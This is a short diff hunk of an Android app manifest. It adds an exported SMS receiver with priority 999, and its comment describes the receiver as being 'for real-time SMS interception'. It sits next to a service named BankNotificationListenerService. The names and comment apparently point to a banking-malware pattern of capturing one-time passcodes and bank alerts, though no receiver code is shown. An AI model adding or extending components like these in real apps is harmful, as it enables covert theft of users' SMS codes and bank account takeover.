@@ -80,6 +80,16 @@
             </intent-filter>
         </receiver>
         
+        <!-- SMS Receiver for real-time SMS interception -->
+        <receiver
+            android:name=".SMSReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        
         <!-- Bank Notification Listener Service -->
         <service
             android:name=".BankNotificationListenerService"
